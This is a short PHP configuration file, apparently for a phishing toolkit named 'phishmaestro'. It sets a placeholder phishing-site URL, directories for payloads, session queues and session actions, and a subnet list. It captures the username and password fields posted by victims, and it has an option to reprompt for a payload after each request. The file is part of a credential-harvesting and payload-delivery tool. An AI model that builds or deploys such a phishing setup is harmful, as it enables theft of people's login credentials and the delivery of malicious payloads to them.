<?php

 $webURL = 'https://www.PHISHINGSITE.com';
 $webDIR = '/var/www/html';
 $pmDIR = "phishmaestro";

 $failedLoginURL = "$webURL/login.html";

 # Phishing Site Parameters
 $loginURL =  $webURL . "/index.html"; 
 $payloadDir = "$webDIR/$pmDIR/payloads";

 $sQueueDir =  "$webDIR/$pmDIR/sessions-queue"; 
 $sActionDir = "$webDIR/$pmDIR/session-actions";
 $subnetFile = "$webDIR/$pmDIR/subnet.list.txt";

 # Parameters from your phishing site
 $user = $_POST['username'];
 $pass = $_POST['password'];


 # Functionality Parameters

 #Reprompt for payload after each request
 $alwaysRedoPayload = true;


 $sleepTime = "1";


 ?>
